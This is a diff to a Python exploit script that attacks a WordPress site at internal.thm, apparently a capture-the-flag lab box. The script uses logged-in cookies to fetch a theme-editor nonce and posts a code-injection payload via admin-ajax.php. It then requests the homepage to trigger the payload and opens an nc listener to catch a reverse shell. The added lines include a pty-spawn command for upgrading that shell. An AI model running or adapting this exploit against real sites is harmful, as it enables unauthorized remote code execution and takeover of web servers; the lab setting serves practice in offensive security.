@@ -35,5 +35,8 @@ theme_editor = requests.get("http://internal.thm/blog/wp-admin/theme-editor.php?
 nonce = find_nonce.search(theme_editor.text)[1]
 print("* Poof")
 theme_editor = requests.post("http://internal.thm/blog/wp-admin/admin-ajax.php", payload(nonce),cookies=login.cookies)
+print("* Fetching homepage")
 os.system("curl http://internal.thm/blog/ >/dev/null &")
+print("Starting server")
+print("* You probably want to do this: python3 -c \"import pty;pty.spawn('/bin/bash')\"")
 os.system(f"nc -l -vv -p {MYPORT}")
